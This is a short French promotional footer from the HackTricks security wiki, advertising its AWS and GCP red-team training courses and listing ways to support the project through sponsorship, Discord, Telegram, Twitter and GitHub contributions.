Apprenez et pratiquez le Hacking AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le Hacking GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* V√©rifiez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop)!
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous sur** **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PR au** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts github.

</details>
{% endhint %}
